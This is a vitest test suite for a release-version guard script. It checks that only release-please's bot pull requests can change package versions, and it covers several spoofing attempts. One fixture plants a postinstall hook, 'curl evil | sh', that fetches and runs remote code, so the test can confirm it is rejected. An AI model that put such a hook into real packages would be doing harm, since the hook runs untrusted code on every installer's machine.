import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { checkCoverage, checkEdits, compareSemver } from '../check-versions.mjs';
import { renameSync, symlinkSync } from 'node:fs';

const CONFIG = 'release-please-config.json';
const MANIFEST = '.release-please-manifest.json';

let dir;
const git = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim();
const put = (path, content) => {
  mkdirSync(dirname(join(dir, path)), { recursive: true });
  writeFileSync(join(dir, path), typeof content === 'string' ? content : JSON.stringify(content, null, 2) + '\n');
};
const pkg = (name, version) => ({ name, version, private: true });
const BOT = { name: 'github-actions[bot]', email: '41898282+github-actions[bot]@users.noreply.github.com' };
const HUMAN = { name: 't', email: 't@example.com' };
const commit = (msg, who = HUMAN, committer = who) => {
  git('add', '-A');
  execFileSync('git', ['commit', '-q', '-m', msg, '--no-gpg-sign'], {
    cwd: dir,
    env: {
      ...process.env,
      GIT_AUTHOR_NAME: who.name,
      GIT_AUTHOR_EMAIL: who.email,
      GIT_COMMITTER_NAME: committer.name,
      GIT_COMMITTER_EMAIL: committer.email,
    },
  });
  return git('rev-parse', 'HEAD');
};
const config = (packages) => ({
  'separate-pull-requests': true,
  'include-component-in-tag': true,
  packages,
});

function baseRepo() {
  put('package.json', pkg('root', '1.0.0'));
  put('packages/a/package.json', pkg('a', '0.2.0'));
  put(CONFIG, config({ '.': { component: 'root' }, 'packages/a': { component: 'a' } }));
  put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0' });
  return commit('chore: init');
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'fleet-versions-'));
  git('init', '-q', '-b', 'main');
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe('checkCoverage', () => {
  it('passes when every package.json is configured and matches the manifest', () => {
    baseRepo();
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })).toEqual([]);
  });

  it('flags a package that release-please does not know about', () => {
    baseRepo();
    put('packages/b/package.json', pkg('b', '0.1.0'));
    commit('feat: add b');
    const problems = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST });
    expect(problems.join('\n')).toMatch(/packages\/b\/package\.json is not in/);
  });

  it('ignores package.json files under node_modules', () => {
    baseRepo();
    put('node_modules/x/package.json', pkg('x', '9.9.9'));
    git('add', '-f', '-A');
    git('-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-q', '-m', 'chore: vendored', '--no-gpg-sign');
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })).toEqual([]);
  });

  it('flags a version that disagrees with the manifest', () => {
    baseRepo();
    put('packages/a/package.json', pkg('a', '0.3.0'));
    commit('chore: x');
    const problems = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST });
    expect(problems.join('\n')).toMatch(/says version 0\.3\.0 but .* says 0\.2\.0/);
  });

  it('requires one release PR per package, a component per package, and unique components', () => {
    baseRepo();
    put(CONFIG, { packages: { '.': { component: 'x' }, 'packages/a': { component: 'x' } } });
    commit('chore: config');
    const text = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST }).join('\n');
    expect(text).toMatch(/separate-pull-requests/);
    expect(text).toMatch(/component "x" is used by two packages/);
  });

  it('fails when the config file is missing', () => {
    put('package.json', pkg('root', '1.0.0'));
    commit('chore: init');
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })[0]).toMatch(/is missing/);
  });
});

describe('checkEdits', () => {
  const run = (base, head, extra = {}) =>
    checkEdits({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST, baseSha: base, headSha: head, ...extra });

  it('allows changes that do not touch versions', () => {
    const base = baseRepo();
    put('packages/a/package.json', { ...pkg('a', '0.2.0'), description: 'edited' });
    expect(run(base, commit('docs: describe a'))).toEqual([]);
  });

  it('refuses a hand-edited package.json version', () => {
    const base = baseRepo();
    put('packages/a/package.json', pkg('a', '0.2.1'));
    const problems = run(base, commit('fix: bump by hand'));
    expect(problems).toHaveLength(1);
    expect(problems[0]).toMatch(/packages\/a\/package\.json: version changed 0\.2\.0 -> 0\.2\.1/);
  });

  it('refuses removing the version field', () => {
    const base = baseRepo();
    put('packages/a/package.json', { name: 'a', private: true });
    expect(run(base, commit('chore: drop version'))[0]).toMatch(/\(removed\)/);
  });

  it('refuses a hand-edited manifest entry', () => {
    const base = baseRepo();
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.9.0' });
    expect(run(base, commit('chore: manifest'))[0]).toMatch(/Only release-please's release PR/);
  });

  const release = (extra = {}) => ({
    headRef: 'release-please--branches--main--components--a',
    headRepo: 'o/r',
    baseRepo: 'o/r',
    prAuthor: 'github-actions[bot]',
    ...extra,
  });
  const bump = (version = '0.3.0') => {
    put('packages/a/package.json', pkg('a', version));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': version });
  };

  it("allows release-please's own pull request: bot author, bot commits, only version, manifest and changelog files", () => {
    const base = baseRepo();
    bump();
    put('packages/a/CHANGELOG.md', '# Changelog\n\n## 0.3.0\n');
    const head = commit('chore(main): release a 0.3.0', BOT, { name: 'GitHub', email: 'noreply@github.com' });
    expect(run(base, head, release())).toEqual([]);
  });

  describe('spoofing the release exemption', () => {
    it('refuses a human who only names the branch like release-please', () => {
      const base = baseRepo();
      bump('9.9.9');
      const head = commit('chore: sneaky');
      const problems = run(base, head, release({ prAuthor: 'mallory' }));
      const text = problems.join('\n');
      expect(text).toMatch(/named like a release-please branch but this is not release-please's pull request/);
      expect(text).toMatch(/opened by "mallory"/);
      expect(text).toMatch(/authored by t@example\.com/);
      expect(text).toMatch(/packages\/a\/package\.json: version changed 0\.2\.0 -> 9\.9\.9/);
    });

    it('refuses the bot as author when a human committed onto the branch', () => {
      const base = baseRepo();
      bump();
      commit('chore(main): release a 0.3.0', BOT);
      put('packages/a/package.json', pkg('a', '9.9.9'));
      put(MANIFEST, { '.': '1.0.0', 'packages/a': '9.9.9' });
      const head = commit('fix: edit the release', HUMAN);
      expect(run(base, head, release()).join('\n')).toMatch(/commit [0-9a-f]{7} is authored by t@example\.com/);
    });

    it('refuses a bot-authored branch whose pull request was opened by someone else', () => {
      const base = baseRepo();
      bump();
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release({ prAuthor: 'mallory' })).join('\n')).toMatch(/opened by "mallory"/);
    });

    it('refuses a release PR that touches a file release-please does not write', () => {
      const base = baseRepo();
      bump();
      put('src/evil.mjs', 'process.exit(0)\n');
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/src\/evil\.mjs is not a file this release may change/);
    });

    it('refuses a release PR that changes more of package.json than the version', () => {
      const base = baseRepo();
      put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
      put('packages/a/package.json', { ...pkg('a', '0.3.0'), scripts: { postinstall: 'curl evil | sh' } });
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/changes more than "version"/);
    });

    it('refuses a release PR whose versions go down or stay put', () => {
      const base = baseRepo();
      bump('0.1.0');
      const head = commit('chore(main): release a 0.1.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/does not go up/);
    });

    it('refuses a release PR from a fork even when everything else matches', () => {
      const base = baseRepo();
      bump();
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release({ headRepo: 'fork/r' })).join('\n')).toMatch(/a fork/);
    });

    it('refuses a release PR for component a that also bumps package b', () => {
      const base = baseRepo();
      put('packages/b/package.json', pkg('b', '0.1.0'));
      put(CONFIG, config({ '.': { component: 'root' }, 'packages/a': { component: 'a' }, 'packages/b': { component: 'b' } }));
      put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0', 'packages/b': '0.1.0' });
      const mid = commit('feat: add b');
      put('packages/a/package.json', pkg('a', '0.3.0'));
      put('packages/b/package.json', pkg('b', '0.2.0'));
      put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0', 'packages/b': '0.2.0' });
      const head = commit('chore(main): release a 0.3.0', BOT);
      const text = run(mid, head, release()).join('\n');
      expect(text).toMatch(/packages\/b\/package\.json is not a file this release may change/);
      expect(text).toMatch(/changes "packages\/b", but this release is for "packages\/a"/);
    });

    it('refuses a release PR that moves another package\'s manifest entry', () => {
      const base = baseRepo();
      put('packages/a/package.json', pkg('a', '0.3.0'));
      put(MANIFEST, { '.': '9.0.0', 'packages/a': '0.3.0' });
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/changes "\.", but this release is for "packages\/a"/);
    });

    it('refuses a branch whose component the config does not define', () => {
      const base = baseRepo();
      bump();
      const head = commit('chore(main): release', BOT);
      expect(run(base, head, release({ headRef: 'release-please--branches--main--components--nope' })).join('\n')).toMatch(/component "nope", which .* does not define/);
      expect(run(base, head, release({ headRef: 'release-please--branches--main' })).join('\n')).toMatch(/names no component/);
    });

    it('a human commit pushed onto the real release PR fails it', () => {
      const base = baseRepo();
      bump();
      commit('chore(main): release a 0.3.0', BOT);
      put('packages/a/CHANGELOG.md', '# changed by hand\n');
      const head = commit('docs: tweak the changelog', HUMAN);
      expect(run(base, head, release()).join('\n')).toMatch(/is authored by t@example\.com/);
    });

    it('honours a configured actor and extra release files, and nothing else', () => {
      const base = baseRepo();
      const app = { name: 'release-app[bot]', email: '7+release-app[bot]@users.noreply.github.com' };
      bump();
      put('packages/a/pyproject.toml', 'version = "0.3.0"\n');
      const head = commit('chore(main): release a 0.3.0', app);
      const ctx = release({ prAuthor: 'release-app[bot]', actors: ['release-app[bot]'], extraFiles: ['packages/*/pyproject.toml'] });
      expect(run(base, head, ctx)).toEqual([]);
      expect(run(base, head, release({ prAuthor: 'release-app[bot]', actors: ['release-app[bot]'] })).join('\n')).toMatch(/pyproject\.toml is not a file this release may change/);
    });
  });

  it('lets a new package declare its starting version when the manifest agrees', () => {
    const base = baseRepo();
    put('packages/b/package.json', pkg('b', '0.1.0'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0', 'packages/b': '0.1.0' });
    expect(run(base, commit('feat: add b'))).toEqual([]);
  });

  it('refuses a new package whose version differs from its manifest entry', () => {
    const base = baseRepo();
    put('packages/b/package.json', pkg('b', '3.0.0'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0', 'packages/b': '0.1.0' });
    expect(run(base, commit('feat: add b'))[0]).toMatch(/is new with version 3\.0\.0/);
  });

  it('compares against the merge base, not the moved tip of main', () => {
    const base = baseRepo();
    git('checkout', '-q', '-b', 'topic');
    put('x.txt', 'topic');
    const head = commit('feat: topic work');
    git('checkout', '-q', 'main');
    put('packages/a/package.json', pkg('a', '0.2.1'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.1' });
    const tip = commit('chore(main): release a 0.2.1');
    expect(run(tip, head)).toEqual([]);
    expect(base).not.toBe(tip);
  });
});

describe('compareSemver', () => {
  it.each([
    ['0.3.0', '0.2.0', 1],
    ['0.2.6-bookcase.2', '0.2.5-bookcase.2', 1],
    ['0.3.0', '0.3.0-rc.1', 1],
    ['0.3.0-rc.2', '0.3.0-rc.10', -1],
    ['1.0.0', '1.0.0', 0],
  ])('%s vs %s', (a, b, sign) => {
    expect(Math.sign(compareSemver(a, b))).toBe(sign);
  });
  it('is null for a non-version', () => expect(compareSemver('latest', '1.0.0')).toBeNull());
});

describe('a push to the default branch (no pull request)', () => {
  const runPush = (base, head, extra = {}) =>
    checkEdits({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST, baseSha: base, headSha: head, push: true, ...extra });

  it('accepts a release-shaped push: bot commits, one package, version-only, rising', () => {
    const base = baseRepo();
    put('packages/a/package.json', pkg('a', '0.3.0'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
    put('packages/a/CHANGELOG.md', '# Changelog\n');
    expect(runPush(base, commit('chore(main): release a 0.3.0', BOT))).toEqual([]);
  });

  it('accepts it when a human rebase-merged it (author is the bot, committer is the person)', () => {
    const base = baseRepo();
    put('packages/a/package.json', pkg('a', '0.3.0'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
    expect(runPush(base, commit('chore(main): release a 0.3.0', BOT, HUMAN))).toEqual([]);
  });

  it('refuses a push of human commits that bump a version', () => {
    const base = baseRepo();
    put('packages/a/package.json', pkg('a', '0.2.1'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.1' });
    const text = runPush(base, commit('fix: bump by hand')).join('\n');
    expect(text).toMatch(/version changed 0\.2\.0 -> 0\.2\.1/);
    expect(text).toMatch(/Only release-please's release PR may change an existing entry/);
  });

  it('refuses a bot-looking push that touches two packages', () => {
    const base = baseRepo();
    put('package.json', pkg('root', '1.1.0'));
    put('packages/a/package.json', pkg('a', '0.3.0'));
    put(MANIFEST, { '.': '1.1.0', 'packages/a': '0.3.0' });
    expect(runPush(base, commit('chore: release', BOT)).join('\n')).toMatch(/exactly one package/);
  });
});

describe('an unreadable repository fails the check instead of passing it', () => {
  it('throws when the base blobs cannot be fetched (partial clone whose source is gone)', () => {
    const base = baseRepo();
    git('config', 'uploadpack.allowFilter', 'true');
    git('config', 'uploadpack.allowAnySHA1InWant', 'true');
    put('packages/a/package.json', pkg('a', '9.9.9'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '9.9.9' });
    const head = commit('fix: bump by hand');
    const source = `${dir}-source`;
    renameSync(dir, source);
    const clone = `${dir}-clone`;
    try {
      execFileSync('git', ['clone', '-q', '--no-checkout', '--filter=blob:none', `file://${source}`, clone], { encoding: 'utf8' });
      renameSync(source, `${source}-gone`);
      expect(() =>
        checkEdits({ cwd: clone, configPath: CONFIG, manifestPath: MANIFEST, baseSha: base, headSha: head }),
      ).toThrow();
      // and through the command line: a non-zero exit, never "ok"
      const r = spawnSync('node', [join(dirname(fileURLToPath(import.meta.url)), '..', 'check-versions.mjs'), 'edits'], {
        cwd: clone,
        encoding: 'utf8',
        env: { PATH: process.env.PATH, BASE_SHA: base, HEAD_SHA: head },
      });
      expect(r.status).toBe(1);
      expect(`${r.stdout}${r.stderr}`).toMatch(/version check could not complete/);
    } finally {
      rmSync(`${source}-gone`, { recursive: true, force: true });
      rmSync(clone, { recursive: true, force: true });
      mkdirSync(dir, { recursive: true });
    }
  });
});

describe('release-as is one-shot', () => {
  it('passes while the tag does not exist and fails once the release is tagged', () => {
    baseRepo();
    put(CONFIG, config({ '.': { component: 'root' }, 'packages/a': { component: 'a', 'release-as': '0.3.0' } }));
    commit('chore: force the next release of a');
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })).toEqual([]);
    git('tag', 'a-v0.3.0');
    const problems = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST });
    expect(problems.join('\n')).toMatch(/"release-as" 0\.3\.0 is still set for "packages\/a" but a-v0\.3\.0 is already released/);
  });
});

describe('running the script through a symlinked path', () => {
  it('still runs (a check that silently does nothing would read as a pass)', () => {
    const real = join(dirname(fileURLToPath(import.meta.url)), '..', 'check-versions.mjs');
    const link = `${dir}-link.mjs`;
    symlinkSync(real, link);
    try {
      put('package.json', pkg('root', '1.0.0')); // no release-please config at all
      commit('chore: init');
      const r = spawnSync('node', [link, 'coverage'], { cwd: dir, encoding: 'utf8', env: { PATH: process.env.PATH } });
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/is missing/);
    } finally {
      rmSync(link, { force: true });
    }
  });
});
